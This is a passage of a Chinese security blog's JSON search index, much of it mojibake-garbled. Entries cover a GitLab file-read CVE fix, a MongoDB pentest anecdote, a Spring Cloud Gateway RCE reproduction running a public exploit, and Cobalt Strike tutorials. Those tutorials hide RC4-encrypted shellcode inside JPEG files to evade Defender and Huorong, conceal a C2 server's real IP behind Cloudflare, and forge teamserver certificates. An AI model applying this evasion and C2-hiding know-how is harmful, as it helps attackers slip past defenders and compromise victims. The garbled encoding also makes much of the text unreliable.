ä¸ºUploadsRewriterçš„ä½¿ç”¨ï¼š#/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/gfm/uploads_rewriter.rb:@text.gsub(@pattern)do|markdown|file=find_file(@source_project,$~[:secret],$~[:file])breakmarkdownunlessfile.try(:exists?)klass=target_parent.is_a?(Namespace)?NamespaceFileUploader:FileUploadermoved=klass.copy_to(file,target_parent)...deffind_file(project,secret,file)uploader=FileUploader.new(project,secret:secret)uploader.retrieve_from_store!(file)uploaderendäºŒã€ä¿®å¤2x01ã€å…³é—­æ³¨å†ŒåŠŸèƒ½å¤§éƒ¨åˆ†é—®é¢˜éƒ½æ˜¯é€šè¿‡åŒ¿åç”¨æˆ·æ³¨å†Œåï¼Œåœ¨ä»“åº“å†…æ“ä½œå¯¼è‡´çš„é—®é¢˜ï¼Œæ•…ï¼šå–æ¶ˆæ¸¸å®¢çš„æ³¨å†Œèƒ½å¤Ÿå‡å°‘80%çš„é—®é¢˜ä»¥Adminç”¨æˆ·ç™»å½•åï¼Œè¿›å…¥ï¼šAdminArea-&gt;Setting-&gt;Sign-uprestrictionsç¡®ä¿Sign-upRestrictionsä¸‹Sign-upenabledä¸ºæœªå‹¾é€‰çŠ¶æ€ã€‚2x02ã€æ›´æ–°ç‰ˆæœ¬ä½†å–æ¶ˆæ³¨å†Œåï¼Œæˆ–è®¸ä»ç„¶æœ‰ä¸€äº›ä¸éœ€è¦æˆæƒçš„æ¼æ´ï¼Œæ‰€ä»¥å°½å¯èƒ½ä¿æŒè½¯ä»¶çš„ç‰ˆæœ¬ä¸ä¸Šæ¸¸ç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼›ä¸‰ã€å‚è€ƒHackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissueCVE-2020-10977Gitlabä»»æ„æ–‡ä»¶è¯»å–å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡ŒGitLabä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°(CVE-2020-10977)GitLabä»»æ„æ–‡ä»¶è¯»å–æ¼æ´CVE-2020-10977HackTheBoxâ€”LaboratoryWriteupCentOS7æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»ºgitlabç¯å¢ƒgitlabæ³¨é”€æ³¨å†ŒåŠŸèƒ½"
  },

  {
    "title"    : "æœªæˆæƒMongoDBï¼šé¸¿é—¨å®´ï¼Ÿ",
    "category" : "",
    "tags"     : "ç¬”è®°",
    "url"      : "/blog/2022/mongoDB-unauth-pentest-walkthrough/",
    "date"     : "Apr 5, 2022",
    "content"  : "è®°ä¸€æ¬¡è‡ªå·±èœé¸Ÿçš„æ¨¡æ ·æ¸—é€ä¸­å‘ç°ä¸€ä¸ªmongoDBçš„ç«¯å£ï¼Œå°è¯•è¿ä¸Šå»åå‘ç°ä»€ä¹ˆæ•°æ®éƒ½è¯»ä¸åˆ°ï¼Œè¯šæƒ¶è¯šæï¼Œè¶Šå¾€ä¸‹è¶Šæ„Ÿè§‰å’ŒMysqlDServerä¼ªé€ è¯»å–æ–‡ä»¶çš„ç°è±¡æ¥è¿‘ï¼Œä¹ƒå¤§æï¼›æˆ˜æˆ˜å…¢å…¢å¦‚å±¥è–„å†°ï¼Œæ— å¥ˆé»˜é»˜æ‰“å¼€wiresharkï¼Œé‡æ–°è¿æ¥ä¸€æ¬¡æ•°æ®åº“ç«¯å£ï¼Œè®°å½•ä¹‹ã€‚fakemysqlDå‰ç½®çŸ¥è¯†ï¼šã€Šä¼ªé€ mysqlæœåŠ¡å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‹é—®é¢˜ä¸»è¦æ˜¯å‡ºåœ¨LOADDATAINFILEè¿™ä¸ªè¯­æ³•ä¸Šï¼Œè¿™ä¸ªè¯­æ³•ä¸»è¦æ˜¯ç”¨äºè¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å¹¶ä¸”æ”¾åˆ°ä¸€ä¸ªè¡¨ä¸­ã€‚è¿™ä¸¤ç§ç”¨æ³•çš„åŒºåˆ«å°±æ˜¯å·®äº†ä¸€ä¸ªlocalï¼Œç¬¬ä¸€ä¸ªSQLè¯­å¥çš„æ„æ€æ˜¯ï¼Œè¯»å–æœåŠ¡å™¨ä¸Š/etc/passwdæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°TestTableä¸­ï¼›ç¬¬äºŒä¸ªSQLè¯­å¥çš„æ„æ€åˆ™æ˜¯ï¼Œè¯»å–æœ¬åœ°ï¼ˆå®¢æˆ·ç«¯ï¼‰è¿™è¾¹çš„/etc/passwdæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°TestTableä¸­æ ·ä¾‹å†™æ³•å¯ä»¥æ˜¯ï¼šloaddatainfile\"/etc/passwd\"intotableTestTable;loaddatalocalinfile\"/etc/passwd\"intotableTestTable;ä¸€åˆ‡çœ‹ä¸Šå»å¾ˆæ­£å¸¸è¿æ¥ä¸Šå»åå¹¶æ²¡æœ‰å‘ç°æœ‰ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ï¼Œè¡¨è¾¾å¼ä¹Ÿèƒ½æ‰§è¡Œï¼štest&gt;0x10+0x10[2022-03-2909:46:34]1rowretrievedstartingfrom1in578ms(execution:546ms,fetching:32ms)[2022-03-2909:47:45]Connectedtest&gt;usetest[2022-03-2909:47:46]completedin266mstest&gt;0x10+0x10å¤§æƒ‘ï¼šå’¦ï¼Ÿéš¾é“ç°åœ¨fakeserverçš„è„šæœ¬è¿™ä¹ˆå‰å®³äº†ï¼Ÿéƒ½èƒ½å¤Ÿæœ‰äº¤äº’äº†ï¼Ÿé«˜äº¤äº’å¼èœœç½ï¼Ÿmongodb-traffic-logç›´åˆ°çœ‹äº†ä¸Šé¢è¿™ä¸ªæŠ¥æ–‡ï¼Œæ‰¾éäº†æ•´ä¸ªåŒ…æ²¡æœ‰å‘ç°â€ä¸å¯å‘Šäººçš„ç§˜å¯†â€ï¼Œæ‰æ”¾ä¸‹åŠé¢—å¿ƒï¼›å„ä½çœ‹ç€ä¸€ç¬‘å°±å¥½ï¼Œè¢«è‡ªå·±èœå“­äº†ã€‚"
  },

  {
    "title"    : "CVE-2022-22947 Spring-Cloud-Gateway-RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CVE-2022-22947-Spring-Cloud-Gateway-RCE/",
    "date"     : "Mar 15, 2022",
    "content"  : "å¼€æºé¡¹ç›®SpringCloudGatewayçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç¼–å·ä¸ºCVE-2022-22947å—å½±å“çš„ç‰ˆæœ¬ä¸ºï¼š3.1.03.0.0åˆ°3.0.6æ—§çš„ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ä¹Ÿå—å½±å“æ¼æ´æŒ–æ˜é¶åœºï¼šjava-jarspring-gateway-demo-0.0.1-SNAPSHOT.jar--debug._________/\\\\/___'_____(_)______\\\\\\\\(()\\___|'_|'_||'_\\/_`|\\\\\\\\\\\\/___)||_)|||||||(_||))))'|____|.__|_||_|_||_\\__,|////=========|_|==============|___/=/_/_/_/::SpringBoot::(v2.6.3-SNAPSHOT)Nettystartedonport9000gatewayç½‘å…³å…³é”®è¯$curlhttp://localhost:9000/actuator{\"_links\":{\"self\":{\"href\":\"http://localhost:9000/actuator\",\"templated\":false},\"gateway\":{\"href\":\"http://localhost:9000/actuator/gateway\",\"templated\":false}}}expåŸä»“åº“$gitremote-vorigin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git(fetch)origin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git(push)$gobuildmain.gogo:downloadinggithub.com/panjf2000/ants/v2v2.4.8go:downloadinggithub.com/go-resty/resty/v2v2.7.0go:downloadinggolang.org/x/netv0.0.0-20211029224645-99673261e6eb$./main-uhttp://127.0.0.1:9000-cwhoamihttp://127.0.0.1:9000'bin4xin\\n'ä¿®å¤æ–¹æ¡ˆ3.1.xç‰ˆæœ¬ç”¨æˆ·åº”å‡çº§åˆ°3.1.1+ç‰ˆæœ¬ï¼Œ3.0.xç‰ˆæœ¬ç”¨æˆ·åº”å‡çº§åˆ°3.0.7+ç‰ˆæœ¬ã€‚åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹ï¼Œé€šè¿‡å°†é…ç½®é€‰é¡¹management.endpoint.gateway.enabledè®¾ç½®ä¸ºfalseç¦ç”¨gatewayactuatorendpointã€‚æ£€æµ‹æ€è·¯æµé‡æ£€æµ‹ï¼šåˆ†æHTTPæµé‡ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸è®¿é—®actuatorgatewayAPIçš„è¯·æ±‚ã€‚2022-03-1510:22:26.711DEBUG11029---[ctor-http-nio-2]o.s.w.s.adapter.HttpWebHandlerAdapter:[68b629bb-1]HTTPPOST\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-2]a.e.w.r.ControllerEndpointHandlerMapping:[68b629bb-1]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#save(String,RouteDefinition)[ctor-http-nio-2].r.m.a.RequestBodyMethodArgumentResolver:[68b629bb-1]Content-Type:application/json[ctor-http-nio-2].r.m.a.RequestBodyMethodArgumentResolver:[68b629bb-1]0..1[org.springframework.cloud.gateway.route.RouteDefinition][ctor-http-nio-2]o.s.http.codec.json.Jackson2JsonDecoder:[68b629bb-1]Decoded[RouteDefinition{id='LZQXX',predicates=[],filters=[FilterDefinition{name='AddResponseHeader',args=(truncated)...][ctor-http-nio-2]o.s.w.s.adapter.HttpWebHandlerAdapter:[68b629bb-1]Completed201CREATED[ctor-http-nio-3]o.s.w.s.adapter.HttpWebHandlerAdapter:[36032421-2]HTTPPOST\"/actuator/gateway/refresh\"[ctor-http-nio-3]a.e.w.r.ControllerEndpointHandlerMapping:[36032421-2]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()[ctor-http-nio-3]o.s.w.s.adapter.HttpWebHandlerAdapter:[36032421-2]Completed200OK[ctor-http-nio-4]o.s.w.s.adapter.HttpWebHandlerAdapter:[9763438e-3]HTTPGET\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-4]a.e.w.r.ControllerEndpointHandlerMapping:[9763438e-3]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#route(String)[ctor-http-nio-4].s.w.r.r.m.a.ResponseEntityResultHandler:[9763438e-3]Using'application/json'given[*/*]andsupported[application/json,application/*+json,application/x-ndjson,text/event-stream][ctor-http-nio-4].s.w.r.r.m.a.ResponseEntityResultHandler:[9763438e-3]0..1[java.util.Map&lt;java.lang.String,java.lang.Object&gt;][ctor-http-nio-4]o.s.http.codec.json.Jackson2JsonEncoder:[9763438e-3]Encoding[{predicate=RouteDefinitionRouteLocator$$Lambda$918/2002125647,route_id=LZQXX,filters=[[[AddRespons(truncated)...][ctor-http-nio-4]o.s.w.s.adapter.HttpWebHandlerAdapter:[9763438e-3]Completed200OK[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-4]HTTPDELETE\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-5]a.e.w.r.ControllerEndpointHandlerMapping:[1f92a2eb-4]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#delete(String)[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-4]Completed200OK[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-5]HTTPPOST\"/actuator/gateway/refresh\"[ctor-http-nio-5]a.e.w.r.ControllerEndpointHandlerMapping:[1f92a2eb-5]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-5]Completed200OKä»¥ä¸Šã€‚å‚è€ƒSpringCloudGatewayè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2022-22947è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°åˆ†æ"
  },

  {
    "title"    : "CSä¸Šçº¿æœ¨é©¬å…æ€å…¥é—¨",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Strike-beacon-bypass-walkthrough/",
    "date"     : "Feb 24, 2022",
    "content"  : "æœ¨é©¬ä¸Šçº¿è€ç”Ÿå¸¸è°ˆçš„é—®é¢˜å°±æ˜¯å…æ€ï¼›ç‰¹åˆ«æ˜¯windowså…æ€ï¼Œå®‰å…¨å¸‚åœºç»è¿‡ç›¸å½“é•¿ä¸€æ®µæ—¶é—´çš„æ´—ç¤¼åï¼Œå›½å†…å·²ç„¶æ¶Œç°å‡ºå¾ˆå¤šã€Œä¼˜ç§€ã€çš„å®‰å…¨è½¯ä»¶ï¼›æ‰€ä»¥æœ¬ç¯‡æ¥ç®€å•èŠä¸€ä¸‹å…æ€å…¥é—¨ï¼Œå¦‚ä½•å¿«é€Ÿé’ˆå¯¹è‡ªå·±çš„éœ€æ±‚åšå‡ºä¸€ä¸ªå…æ€æ•ˆæœè¿˜ä¸é”™çš„æœ¨é©¬ï¼›æ³¨æ„/ATTENTIONPLZ!!!WindowsDefenderå…³é—­è‡ªåŠ¨æäº¤æ ·æœ¬Windowså®‰å…¨ä¸­å¿ƒ-&gt;ç—…æ¯’å’Œå¨èƒé˜²æŠ¤-&gt;â€œç—…æ¯’å’Œå¨èƒé˜²æŠ¤â€è®¾ç½®-&gt;ç®¡ç†è®¾ç½®-&gt;è‡ªåŠ¨æäº¤æ ·æœ¬ã€å…³ã€‘è¿‡äº†å…æ€ä¸è¦ä¼ åˆ°ä»»ä½•æ²™ç®±1ã€ç¯å¢ƒGolangBasedonWindowsPythonBasedonWindow/Linux/macOSpip/pip3CS-LoaderåŸä»“åº“ï¼šorigin\thttps://github.com/Gality369/CS-Loader.git(fetch)origin\thttps://github.com/Gality369/CS-Loader.git(push)2ã€å®ç°è¯¦ç»†è¿‡ç¨‹å¯ä»¥å‚è€ƒCS-Loaderä»“åº“æ•™ç¨‹ä¸åšæ¬è¿2x01æ•ˆæœgolangç‰ˆæˆåŠŸé€šè¿‡å¾®è½¯Defender/ç«ç»’å…æ€ï¼›ç«ç»’å¾®è½¯Defender3ã€æ€è·¯3x00æ¢³ç†å»ºè®®è‡ªå·±å°è¯•ä¸€ä¸‹è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢çš„READMEï¼Œæˆ–è€…æˆ‘è¿™é‡Œä¼ äº†ä¸€ä»½æ¢³ç†è¿‡åçš„ä»£ç ä¸‹é¢çœ‹ä¸€ä¸‹å›¾ç‰‡shellcodeçš„åŠ å¯†ç”Ÿæˆæ–¹å¼3x01å›¾ç‰‡shellcodeç”Ÿæˆ#base64encodebaseStr=base64.b64encode(shellcode)#RC4+base64encodepayload=rc4(baseStr,key)withopen(imgName,'rb')asf:img=f.read()fileend=img[-2:]if(ord(fileend[0])!=255andord(fileend[0])!=217):if(img.count(chr(255)+chr(217))&gt;0):#ä¸ä»¥ffd9ç»“å°¾ï¼Œä½†æ˜¯å†…å®¹ä¸­åŒ…å«æœ‰ffd9ï¼Œè¯´æ˜å›¾ç‰‡æœ‰è¯¯æˆ–è€…å·²ç»åœ¨ffd9åè¿½åŠ è¿‡å†…å®¹äº†print(\"Pleasechangetheimg.\")exit(0)else:payload=img+chr(255)+chr(217)+payloadprint(\"Abnormalendoffile,autoadd\\xff\\xd9\")#ä»¥ä¸Šåˆ¤æ–­å›¾ç‰‡çš„æ­£ç¡®æ€§ä»¥åŠè¿›è¡Œå›¾ç‰‡çŸ«æ­£else:payload=img+payload#æ’å…¥çš„å›¾ç‰‡æ’å…¥ç»è¿‡rc4åŠ å¯†çš„base64(shellcode)ï¼Œå¾€ä¸‹çœ‹rc4withopen(\"shellcode_\"+imgName,'wb')asf1:f1.write(payload)print(\"Payloadhaswritetoshellcode_\"+imgName)rc4ï¼š#rc4æ¥æ”¶ä¸»æ–¹æ³•ä¼ è¿‡æ¥çš„(b64encode(shellcode),rc4åŠ å¯†key)defrc4(text,key):key=hashlib.md5(key).hexdigest()#Usemd5(key)toget32-bitkeyinsteadrawkeyresult=''key_len=len(key)#1.initS-boxbox=list(range(256))#put0-255intoS-boxj=0foriinrange(256):#shuffleelementsinS-boxaccordingtokeyj=(j+box[i]+ord(key[i%key_len]))%256#å–æ¨¡box[i],box[j]=box[j],box[i]#swapelementsi=j=0forelementintext:i=(i+1)%256j=(j+box[i])%256box[i],box[j]=box[j],box[i]k=chr(ord(element)^box[(box[i]+box[j])%256])result+=k#blablabla..result=base64.b64encode(result)returnresultåŠ å¯†æ•ˆæœï¼š$pythongenerator.pyADdk943ZPviJWuFP5HO6HsUbbf3/UibLBKbjBQNvx314kU2L8vjUSpdIwV/cx20/2W0Skzghdf4oYRZfF1/0P+xhSgYqRXESzhXpqoLHXiVzDyezyOp9p03As6I3lXCP9w9r+CBG5VQIg3sCak05aAG1rRAoAD8L7FbzFQCbnhn+BgKe4A7J95vKyGzmFBuNiQoBqOEbNKNuF6oaXbsDTw6s9ymflG7yna8Os9zOOS4JSFZ5Ds4slcQ6pFHZK16OERLSN9x8hdjlLVKUKqTmPhl1Y3hepr2nF5G/NkS6esZTEsEJHRPcXpQineKVL/T5uxoliiLOeZdjlrGgnDGrgMC5N8O66DXyK3bGdYpVMrzj9iQzCwdXn0PdquAhAZynjtos1c6S4De9EVxbJaes6k/QeCjrkD234qPTt5c4C8zm/bhrZ0ghVAAl4LPwiPZsu5bYONMeYApBJ81IBec46RSFFN5LWzdhJEutJDx9w/AyYS1iphRShAczz6GmeVDaXeY83LhzKNKMlXNJfVv57DFDX4MiKiZq4SO5roUkUQ1mTYCG3LzdTFDhC7JQdwML2WBwubnPt8kCs6woxC0P2y5eAn77KivDovGsB3INBxqErgonfKWPgcCJVixYBfRP7FxfBYoAjw9xiiLuwDOxQaYAKGAfPI/9ctphRPWa8ZPzaJ7fpF4dO8UERVh0/IYlgeJx9hLVvEkjf9O0y1O688E1Giuo+D8pgdZo4WnsTWNBfU+woqo/34ZzxHV/3xKFlKljBD0+XoyKTLYmUju6pwv5TEfBbiMd+Hrs5Oh9s0fkKOyybuhrCEX8zrpMHcNhng996olYzcKNxCoZzDuFFvDwGkX3vXNN+GWTgKZc6lnp+hrX2Z0ZDaivLVyZU2NCS6YBq7BjEgntO2oYWlRiUXUKejHysunVUVE4LPtiO6nAJXTELd3SAXG8G4Sy5RjDK3c0GaAjvaeJ0//TpFecPPvMOJCukvvwoUTziex5cQ8Q+C6TwQKlO0zgHdXHALfkkSroBBGmqGZjqdCgaTTKHKOoAC9STz83g6jsI//Jpkjfwc3Avp75u1/4dswHjJk73Ncl9VMXxvMAVFqHzFM1+zuDQo74fw1DLwwXMLDoBuBgD5kf5emmhgDtFRDO5FofOlhQ4L06vNgGJw7s1D1b76YWmY6xv5Uk1IvTYqn8cb4bFzHrQgwuhPcBpITJ7Q7Wu7HZhlLkfKLor7kso4fn0gDUv258Q1MDelXWABmdlkzYSKOUOnsRUTi2hSI65Wy9GgL6IAyMx6vo/iwuKlYlkBafqPjFNY2O3LhVgTYrxmC8y7oXHnBR23wFNrNXlvtct/B8xIL8hiPA4rVcpK2ouPacFZYbdjS74JUdHwKMv5lAC3UpmoevzCQzcze0R03R5p6ZHgvjLxuqKFBkKSgHrAbivLnMEPDXzK3UeKSvG2ftsZiXPCPMZTjD0jBti4ubHc++RzHVC+Zq6ioj3nXjifF2FoJcnPGcdKkYHZBZlL6X5ptXxsT2FFtUTgZYD+iBnS4UlmTdK/oKNsds+ma8E1iBv4K04P83bSIgvunvA/xFX3N6u0m5qevZemY+RTsynSjPrg==#çœ‹èµ·æ¥åƒbase64ï¼Œå®é™…ä¸Šæ— æ³•åç¼–ç $pythongenerator.py|base64-d7dï¿½ï¿½&gt;ï¿½Zï¿½Oï¿½sï¿½ï¿½ï¿½ï¿½R&amp;ï¿½ï¿½ï¿½oï¿½}xï¿½Mï¿½ï¿½ï¿½ï¿½Jï¿½Hï¿½_ï¿½ï¿½m?ï¿½mï¿½8!uï¿½(a__ï¿½?ï¿½aJ*Eqï¿½éª‚ï¿½^%s'ï¿½ï¿½ï¿½}ï¿½Mï¿½ï¿½ï¿½7ï¿½pï¿½ï¿½kï¿½Fï¿½ï¿½{jM9hï¿½ï¿½(?...å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨åšæ¸—é€çš„æ—¶å€™ä¹Ÿå¯ä»¥å‘ç°è¿™æ ·ç±»ä¼¼çš„åŠ å¯†ç®—æ³•ï¼Œä»£ç æˆ‘ä¹Ÿæ”¾åˆ°äº†Biggerä»“åº“::generator.pyï¼Œå½“ç„¶å…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼Œæƒå½“æŠ›ç –å¼•ç‰ï¼›ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "Cobalt StrikeæœåŠ¡å™¨éšè—çœŸå®ip",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Stike-hidden-true-ip/",
    "date"     : "Feb 19, 2022",
    "content"  : "CobaltStikeå¤‡å¿˜å½•IIæœ¬ç« é˜è¿°é‡ç‚¹åœ¨äºå¦‚ä½•æ­å»ºé’ˆå¯¹C2æœåŠ¡å™¨è¿›è¡ŒCDNæ¥å…¥ä»¥åŠçœŸå®ipéšè—æ²¡å†™å®Œï¼Œå¡åœ¨CDNä¸Šçº¿å’ŒCSå¯†é’¥ä¿®æ”¹äº†ï¼Œæœ‰ç©ºä¼šç»§ç»­è¡¥å……å®Œã€‚cobaltstrikeæœåŠ¡ç«¯é…ç½®TIPS:æŸ¥çœ‹CobaltStikeæœåŠ¡å™¨æ­å»ºç™»å½•VPSå¯åŠ¨teamserverä¿®æ”¹åŸŸådnsåˆ°Cloudflareæ·»åŠ DNSAè®°å½•åˆ°teamserverç›‘å¬çš„VPSçœŸå®IPSSL/TLS-è¾¹ç¼˜è¯ä¹¦-ç¡®ä¿å¦‚ä¸‹é€‰é¡¹ä¸ºOFFï¼šè‡ªåŠ¨HTTPSé‡å†™/å§‹ç»ˆä½¿ç”¨HTTPSç¼“å­˜-é…ç½®-alwaysonlineç­‰å¾…å®ŒæˆpingåŸŸååå·²ç»æ¥å…¥CDNï¼›cobaltstrikeå®¢æˆ·ç«¯é…ç½®æ·»åŠ Listenerså¹¶å¡«å†™hostå’ŒportCloudflareHTTPç«¯å£80,8080,8880,2052,2082,2086,2095CloudflareHTTPSç«¯å£443,2053,2083,2087,2096,8443å¦‚ä¸Šé…ç½®å¯ä»¥ä¸Šçº¿æˆåŠŸï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å…³åŸŸåçš„æµé‡ï¼Œä½†è¿›è¡Œè¿›ä¸€æ­¥åˆ†æåå‘ç°ä»ç„¶å­˜åœ¨ç›¸å…³CSæœåŠ¡å™¨çš„æµé‡äº¤äº’äºæ˜¯æˆ‘å°±åœ¨æƒ³æ˜¯å¦å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤Ÿé€šè¿‡åŸŸåçš„æ–¹å¼è¿›è¡Œæµé‡è¯·æ±‚å‘¢ï¼Ÿäºæ˜¯æˆ‘è¿›è¡Œäº†è¸©å‘ï¼š1x01Clientconfig1BeaconHttp:HttpHost(s)/Stager/Headerå‡å¡«å†™å¯¹åº”åŸŸåï¼›HttpPortä¸ºCFæ”¯æŒè§£æHTTPç«¯å£å¤±è´¥ï¼Œæ— æ³•ä¸Šçº¿ï¼›1x02Clientconfig2BeaconHttps:HttpHost(s)/Stager/Headerå‡å¡«å†™å¯¹åº”åŸŸåï¼›HttpPortä¸ºCFæ”¯æŒè§£æHTTPç«¯å£æˆåŠŸä¸Šçº¿ï¼›ä½†æ˜¯æ‰§è¡ŒBeaconæ— è¿”å›ï¼Œå¦‚ä¸‹ï¼šbeacon&gt;getuid[*]Taskedbeacontogetuserid[+]hostcalledhome,sent:8byteså¤šæä¸€å¥ï¼š1x01/1x02httpä¸httpsåœ¨æ•°æ®åŒ…ä¸­çš„ä½“ç°æ˜¯httpåŒ…ä¸tcp/tlsçš„åŒºåˆ«ï¼›æœ‰å…´è¶£å¯ä»¥çœ‹æˆ‘æŠ“ä¸‹æ¥çš„æ•°æ®åŒ…äºæ˜¯æˆ‘å°è¯•é’ˆå¯¹é¶æœºä¸­çš„æµé‡å°è¯•åˆ†æï¼Œå‘ç°å½“å°è¯•æ‰§è¡Œbeaconï¼Œé¶æœºæµé‡ä¼šå®šå‘åˆ°cf.profileé…ç½®çš„apiæ¥å£ï¼šhttp://domain/api/1301â€“&gt;https://domain/api/1returnâ€“&gt;code525SSLhandshakefailedçœ‹èµ·æ¥åƒæ˜¯sslè¯ä¹¦çš„é—®é¢˜ï¼Œæƒ³èµ·æ¥CloudFlareSSLæ¨¡å¼ä¸ºè‡ªç­¾åè¯ä¹¦ï¼Œäºæ˜¯ä¿®æ”¹ä¸ºCFCAè¯ä¹¦è¿›ä¸€æ­¥æ’æŸ¥é—®é¢˜ï¼›ç»è¿‡72ä¸ªå°æ—¶çš„é‡å¤çš„æ¯ç‡¥å·¥ä½œï¼Œå¾—å‡ºä¸€ä¸ªç»“è®ºï¼šåœ¨å°è¯•åŸºäºCDNæŠ€æœ¯è¿›è¡ŒCSæœåŠ¡å™¨éšè—ipæ—¶ï¼Œhttp(s)Hostsæ å¿…é¡»å¡«å…¥ç›¸å…³csä¸»æœºçš„çœŸå®ipï¼›éªŒè¯ç”Ÿæˆæœ¨é©¬windows/beacon_http/reverse_httpæ‰§è¡Œshellå‘½ä»¤beacon&gt;shellipconfigåœ¨æµ‹è¯•é¶æœºé‡Œæ‰“å¼€wiresharkç›‘å¬æµé‡ï¼Œæµé‡å·²ç»å‘é€åˆ°å¯¹åº”åŸŸåï¼šè¿”å›ç­‰å¾…æ‰§è¡Œå‘½ä»¤çš„è¿”å›åŒ…å‚è€ƒåæº¯æº-cså’ŒmsfåŸŸåä¸Šçº¿çº¢é˜ŸåŸºç¡€å»ºè®¾:éšè—ä½ çš„C2serveræ£€æµ‹ä¸éšè—CobaltstrikeæœåŠ¡å™¨/#CDNC2æœåŠ¡å™¨éšè—çœŸå®ip"
  },

  {
    "title"    : "Cobalt StrikeæœåŠ¡å™¨æ­å»ºå†ç¨‹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Strike-Server-build-walkthrough/",
    "date"     : "Feb 15, 2022",
    "content"  : "CobaltStikeå¤‡å¿˜å½•Iæœ¬ç« é˜è¿°é‡ç‚¹åœ¨äºå¦‚ä½•æ­å»ºèµ·ä¸€ä¸ªC2æœåŠ¡å™¨å¹¶ä¸”å¦‚ä½•éšè—CSç›¸å…³ç‰¹å¾æ­å»º#clientscpCobalt-Stike.tar.gzusername@&lt;vps_ip&gt;:~#servertar-zxvfCobalt-Stike.tar.gz0x01noprofile#servernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;&amp;#clientjava-XX:ParallelGCThreads=4-XX:+AggressiveHeap-XX:+UseParallelGC-jarcobaltstrike.jar#è¾“å…¥&lt;vps_ip&gt;&lt;connect_password&gt;#åå­—ä»»æ„å¡«å…¥0x02profile#servernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;your_mode.profile&amp;#clientjava-XX:ParallelGCThreads=4-XX:+AggressiveHeap-XX:+UseParallelGC-jarcobaltstrike.jar#è¾“å…¥&lt;vps_ip&gt;&lt;connect_password&gt;#åå­—ä»»æ„å¡«å…¥åŒºåˆ«åœ¨äºåŠ ä¸Šè‡ªåˆ¶profileå¯ä»¥é’ˆå¯¹ä¿®æ”¹å—å®³å®¢æˆ·ç«¯å’ŒC2æœåŠ¡å™¨HTTP/Sçš„æµé‡ç‰¹å¾ï¼Œé¿å…è¢«ã€Œç®€å•çš„å±€åŸŸç½‘çˆ¬è™«ä»¬ã€çˆ¬åˆ°ä»¥è‡³äºè¢«æŒ‚é»‘åå•ã€‚æ¶ˆé™¤ç‰¹å¾1x01ä¿®æ”¹é»˜è®¤ç«¯å£CSæœåŠ¡å™¨é»˜è®¤ç›‘å¬åœ¨50050ç«¯å£ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‰ç¼–è¾‘teamserveræ–‡ä»¶æ›´æ”¹ç›‘å¬ç«¯å£ï¼šsed-i's/50050/10080/g'teamserverchmod+xteamservernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;&amp;å¯ä»¥çœ‹åˆ°æ—¥å¿—ï¼š[+]Teamserverisupon0.0.0.0:100801x02ä¼ªé€ è¯ä¹¦åˆ é™¤é»˜è®¤çš„è¯ä¹¦rm./cobaltstrike.storeæŸ¥çœ‹teamserverä»£ç ä¸­åŸè¯ä¹¦keytool-list-v-storepass123456-keystorecobaltstrike.storeå¹¶é‡ç­¾ä¸€ä¸ªä¼ªé€ è¯ä¹¦rm./cobaltstrike.storesed-i's!-aliascobaltstrike-dname\"CN=MajorCobaltStrike,OU=AdvancedPenTesting,O=cobaltstrike,L=Somewhere,S=Cyberspace,C=Earth\"!-aliascommon-domain.com-dname\"CN=common-domainWindows,OU=MOPR,O=SentrylabInc,L=Redmond,ST=HEFEI,C=CN\"!g'teamservernmapæ‰«æ/æ¶ˆé™¤ç‰¹å¾æ•ˆæœï¼šPORTSTATESERVICEVERSION10080/tcpopenssl/unknown|ssl-cert:Subject:commonName=common-domainWindows/organizationName=SentrylabInc/stateOrProvinceName=HEFEI/countryName=CN|Issuer:commonName=common-domainWindows/organizationName=SentrylabInc/stateOrProvinceName=HEFEI/countryNam